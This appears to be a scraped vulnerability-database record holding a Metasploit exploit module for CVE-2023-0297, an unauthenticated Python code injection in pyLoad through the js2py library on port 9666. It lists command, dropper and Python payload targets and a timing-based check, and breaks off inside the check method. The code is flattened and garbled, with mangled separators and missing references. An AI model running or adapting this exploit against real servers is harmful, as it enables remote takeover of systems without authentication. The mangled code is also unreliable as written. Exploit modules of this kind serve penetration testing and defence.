{
    "text": "vul_name : pyLoad js2py Python Execution ， vul_cve : CVE-2023-0297 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'rex/stopwatch' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， super (  ， update_info (  ， info ,  ， 'Name' => 'pyLoad js2py Python Execution' ,  ， 'Description' => %q{ ， pyLoad versions prior to 0.5.0b3.dev31 are vulnerable to Python code injection due to the pyimport ， functionality exposed through the js2py library. An unauthenticated attacker can issue a crafted POST request ， to the flash/addcrypted2 endpoint to leverage this for code execution. pyLoad by default runs two services ,  ， the primary of which is on port 8000 and can not be used by external hosts. A secondary \"Click 'N' Load\" ， service runs on port 9666 and can be used remotely without authentication. ， } ,  ， 'Author' => [  ， 'Spencer McIntyre' ,  # metasploit module ， 'bAu' # vulnerability discovery ，  ]  ,  ， ' ，  [ 'CVE' , '2023-0297' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  # fix commit ，  ]  ,  ， 'DisclosureDate' => '2023-01-13' ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => [ 'unix' , 'linux' , 'python' ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 , ARCH_PYTHON ]  ,  ， 'Privileged' => true ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : linux_dropper ， } ，  ]  ,  ，  [  ， 'Python' ,  ， { ， 'Platform' => 'python' ,  ， 'Arch' => ARCH_PYTHON ,  ， 'Type' => : python_exec ， } ，  ]  ,  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ IOC_IN_LOGS , ARTIFACTS_ON_DISK ]  ， } ， register_options (  [  ， Opt : RPORT ( 9666 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/' ]  )  ，  ]  )  ， end ， def check ， sleep_time = rand ( 5.10 )  ， _ , elapsed_time = Rex : Stopwatch.elapsed_time do ， execute_python ( \"import time ; time.sleep (  # {sleep_time} ) \" )  ， end ， vprint_status ( \"Elapsed time :  # {elapsed_time} seconds\" )  ， unless elapsed_time > sleep_time",
    "time": "2023.02.22"
}